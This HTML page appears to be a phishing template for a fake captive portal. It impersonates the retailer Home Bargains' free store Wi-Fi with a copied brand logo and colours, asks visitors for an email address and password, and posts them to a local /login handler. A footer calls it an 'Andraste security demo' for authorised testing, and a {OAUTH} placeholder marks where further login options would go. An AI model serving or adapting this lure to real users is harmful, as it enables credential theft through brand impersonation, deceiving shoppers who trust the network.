<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Home Bargains Free WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f5f5f5;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:24px 16px}
.card{background:#fff;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.12);width:100%;max-width:360px;overflow:hidden}
.hdr{background:#CC1230;padding:20px 24px;text-align:center}
.logo-wrap{display:inline-flex;align-items:center;gap:10px}
.logo-diamond{width:44px;height:44px;flex-shrink:0}
.logo-text{color:#fff;text-align:left}
.logo-text .home{font-size:18px;font-weight:800;letter-spacing:.5px;line-height:1.1}
.logo-text .barg{font-size:13px;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;color:#FFD600;line-height:1.1}
.body{padding:24px}
h2{font-size:17px;font-weight:700;color:#1a1a1a;margin-bottom:4px}
p.sub{font-size:13px;color:#666;margin-bottom:20px}
input{display:block;width:100%;padding:12px 14px;border:1.5px solid #ddd;border-radius:8px;font-size:15px;margin-bottom:12px;outline:none;transition:border .2s}
input:focus{border-color:#CC1230}
button{width:100%;padding:13px;background:#CC1230;color:#fff;border:0;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer;letter-spacing:.3px}
button:active{background:#a00f24}
.divider{display:flex;align-items:center;gap:12px;margin:18px 0 6px;font-size:12px;color:#999}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#e8e8e8}
.foot{font-size:11px;color:#aaa;text-align:center;margin-top:20px;line-height:1.6}
.foot a{color:#CC1230;text-decoration:none}
</style>
</head>
<body>
<div class="card">
  <div class="hdr">
    <div class="logo-wrap">
      <!-- Home Bargains diamond logo (inline SVG) -->
      <svg class="logo-diamond" viewBox="0 0 44 44" xmlns="http://www.w3.org/2000/svg">
        <polygon points="22,2 42,22 22,42 2,22" fill="#FFD600" stroke="#CC1230" stroke-width="1.5"/>
        <text x="22" y="18" font-family="Arial Black,sans-serif" font-size="10" font-weight="900" fill="#CC1230" text-anchor="middle" dominant-baseline="middle">HB</text>
        <text x="22" y="30" font-family="Arial,sans-serif" font-size="5.5" font-weight="700" fill="#CC1230" text-anchor="middle" dominant-baseline="middle">HOME</text>
      </svg>
      <div class="logo-text">
        <div class="home">Home Bargains</div>
        <div class="barg">Free&nbsp;Wi-Fi</div>
      </div>
    </div>
  </div>

  <div class="body">
    <h2>Sign in to continue</h2>
    <p class="sub">Access Home Bargains free store Wi-Fi</p>

    <form method="POST" action="/login" autocomplete="on">
      <input name="u" type="email" inputmode="email" autocomplete="email"
             placeholder="Email address" required>
      <input name="p" type="password" autocomplete="current-password"
             placeholder="Password">
      <button type="submit">Connect</button>
    </form>

    {OAUTH}

    <p class="foot">
      By connecting you agree to our
      <a href="#">Terms of Use</a> &amp; <a href="#">Privacy Policy</a>.<br>
      Network provided by Home Bargains Stores Ltd.
    </p>
  </div>
</div>

<p style="font-size:10px;color:#ccc;margin-top:16px;text-align:center">
  Andraste security demo &mdash; authorised testing only.
</p>
</body>
</html>
